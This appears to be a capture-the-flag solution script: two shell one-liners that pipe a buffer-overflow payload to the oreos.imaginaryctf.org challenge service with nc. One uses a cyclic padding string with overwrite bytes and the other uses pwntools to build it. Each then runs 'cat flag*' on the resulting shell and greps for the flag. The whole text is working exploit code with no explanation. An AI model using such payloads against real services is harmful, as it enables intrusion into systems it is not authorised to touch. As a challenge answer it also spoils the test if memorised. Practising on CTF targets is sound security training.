echo -e 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa7\x137\x13\x00\x00\x00\x00\n cat flag* \n exit' | nc oreos.imaginaryctf.org 7331 | grep -o 'ictf.*'
python -c 'from pwn import *; print( flat( { p64(0x6161617661616175): p64(0x13371337) } ).decode() , "\n cat flag* \n exit" )'           | nc oreos.imaginaryctf.org 7331 | grep -o 'ictf.*'
